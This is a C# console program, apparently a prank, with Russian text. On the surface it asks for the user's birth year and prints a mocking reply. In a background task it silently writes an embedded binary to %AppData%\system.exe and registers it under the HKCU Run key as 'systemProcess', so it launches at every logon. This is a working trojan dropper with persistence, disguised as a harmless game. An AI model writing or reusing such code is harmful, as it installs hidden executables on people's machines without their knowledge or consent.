using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static System.Net.Mime.MediaTypeNames;

namespace Setup
{
    internal class Program
    {
        static string pathToPrikol = $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\system.exe";

        static void Main(string[] args)
        {
            Task.Run(() =>
            {
                try
                {
                    File.WriteAllBytes(pathToPrikol, Resource1.SystemFile);
                    SetToAutorun("systemProcess");
                }

                catch
                {
                    Console.WriteLine("Какаета ошибка!!!!");
                }
            });

            Console.ForegroundColor = ConsoleColor.Yellow;

            Console.Write("Введите ваш год рождения: ");
            Console.ReadLine();
            Console.ForegroundColor = ConsoleColor.Yellow;

            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("Загрузка");

            Thread.Sleep(1000);

            for (var i = 0; i < 10000; i++) Console.Write($"{i}");

            Thread.Sleep(1000);

            Console.WriteLine();

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("Похоже вам: ");

            Thread.Sleep(1000);

            Console.WriteLine("Аапапахапхахпхапахпхапх, а я че знаю что-ли, апаапазпзапзапзазпазпхапвхаххпахххапахпхапаххаппаапъаъпхаахпахпап");

            Console.ReadKey();
        }

        static void SetToAutorun(string nameInRegistry)
        {
            try
            {
                using(var key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                    key.SetValue(nameInRegistry, pathToPrikol);
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Ошибка" + ex.Message);
                Console.ForegroundColor = ConsoleColor.White;
            }
        }
    }
}
